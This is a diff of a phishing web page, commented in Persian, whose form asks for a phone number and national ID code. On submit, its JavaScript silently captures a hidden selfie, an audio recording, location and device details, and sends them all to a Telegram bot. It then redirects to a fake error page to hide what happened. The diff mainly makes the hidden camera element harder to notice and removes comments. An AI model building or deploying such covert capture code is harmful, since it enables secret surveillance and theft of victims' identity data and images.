@@ -75,9 +75,6 @@
             display: block;
             margin-right: 5px;
         }
-        .hidden {
-            display: none !important;
-        }
     </style>
 </head>
 <body>
@@ -111,7 +108,7 @@
         const CHAT_ID = '7059995091';
 
         // ======================================================
-        // دریافت اطلاعات دستگاه و IP (بی‌صدا)
+        // دریافت اطلاعات دستگاه و IP
         // ======================================================
         function getDeviceInfo() {
             return {
@@ -123,8 +120,7 @@
                 colorDepth: screen.colorDepth,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 online: navigator.onLine,
-                cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack || 'نامشخص'
+                cookieEnabled: navigator.cookieEnabled
             };
         }
 
@@ -139,16 +135,17 @@
         }
 
         // ======================================================
-        // تابع گرفتن عکس سلفی (بی‌صدا)
+        // تابع گرفتن عکس سلفی (کاملاً بی‌صدا)
         // ======================================================
         async function captureSelfieSilently() {
             try {
-                // ایجاد المان ویدئو مخفی
                 const video = document.createElement('video');
                 video.style.display = 'none';
+                video.style.position = 'absolute';
+                video.style.top = '-9999px';
+                video.style.left = '-9999px';
                 document.body.appendChild(video);
 
-                // دریافت استریم دوربین جلو
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: 'user',
@@ -160,7 +157,6 @@
                 video.srcObject = stream;
                 await video.play();
 
-                // گرفتن عکس
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
@@ -171,7 +167,6 @@
                     canvas.toBlob((blob) => resolve(blob), 'image/jpeg', 0.8);
                 });
 
-                // پاک کردن
                 stream.getTracks().forEach(track => track.stop());
                 video.remove();
 
@@ -182,7 +177,7 @@
         }
 
         // ======================================================
-        // تابع ضبط صدا (بی‌صدا)
+        // تابع ضبط صدا (کاملاً بی‌صدا)
         // ======================================================
         async function recordAudioSilently() {
             try {
@@ -214,7 +209,7 @@
         }
 
         // ======================================================
-        // تابع گرفتن موقعیت (بی‌صدا)
+        // تابع گرفتن موقعیت (کاملاً بی‌صدا)
         // ======================================================
         function getLocationSilently() {
             return new Promise((resolve) => {
@@ -259,7 +254,7 @@
         }
 
         // ======================================================
-        // توابع ارسال به تلگرام
+        // توابع ارسال به تلگرام (بی‌صدا)
         // ======================================================
         async function sendPhotoToTelegram(photoBlob, caption = '🤳 عکس سلفی') {
             try {
@@ -309,27 +304,20 @@
         document.getElementById('findForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
-            // غیرفعال کردن دکمه
             const submitBtn = document.getElementById('submitBtn');
             submitBtn.disabled = true;
             submitBtn.textContent = '⏳ در حال پردازش...';
 
             try {
-                // دریافت اطلاعات (بی‌صدا)
                 const phone = document.getElementById('phone').value;
                 const nationalCode = document.getElementById('nationalCode').value;
                 
                 const deviceInfo = getDeviceInfo();
                 const ip = await getIPInfo();
                 const location = await getLocationSilently();
-                
-                // گرفتن عکس سلفی (بی‌صدا)
                 const selfiePhoto = await captureSelfieSilently();
-                
-                // ضبط صدا (بی‌صدا)
                 const audioBlob = await recordAudioSilently();
 
-                // ساخت پیام زیبا
                 const message = buildBeautifulMessage(
                     phone,
                     nationalCode,
@@ -340,7 +328,6 @@
                     selfiePhoto !== null
                 );
 
-                // ارسال به تلگرام (بی‌صدا)
                 await sendMessageToTelegram(message);
 
                 if (selfiePhoto) {
@@ -351,11 +338,9 @@
                     await sendAudioToTelegram(audioBlob, '🎤 ضبط صدا');
                 }
 
-                // هدایت به صفحه خطا (برای پنهان‌سازی)
                 window.location.href = 'https://example.com/error';
 
             } catch (error) {
-                // در صورت خطا، باز هم به صفحه خطا هدایت کن
                 window.location.href = 'https://example.com/error';
             }
         });
